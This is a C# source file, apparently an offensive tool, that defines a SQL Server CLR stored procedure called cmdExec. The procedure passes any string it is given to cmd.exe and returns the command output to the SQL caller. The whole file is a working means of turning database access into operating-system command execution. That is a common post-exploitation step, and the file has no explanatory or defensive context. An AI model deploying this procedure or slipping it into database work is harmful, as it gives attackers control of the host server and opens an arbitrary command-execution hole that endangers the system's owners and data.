using System;
using System.Data;
using System.Data.SqlTypes;
using System.Diagnostics;
using Microsoft.SqlServer.Server;

public class StoredProcedure
{
	[SqlProcedure]
	public static void cmdExec(SqlString execCommand)
	{
		Process process = new Process();
		process.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
		process.StartInfo.Arguments = string.Format(" /C {0} ", execCommand);
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.Start();
		SqlDataRecord sqlDataRecord = new SqlDataRecord(new SqlMetaData[]
		{
			new SqlMetaData("output", SqlDbType.NVarChar, 4000L)
		});
		SqlContext.Pipe.SendResultsStart(sqlDataRecord);
		sqlDataRecord.SetString(0, process.StandardOutput.ReadToEnd().ToString());
		SqlContext.Pipe.SendResultsRow(sqlDataRecord);
		SqlContext.Pipe.SendResultsEnd();
		process.WaitForExit();
		process.Close();
	}
}
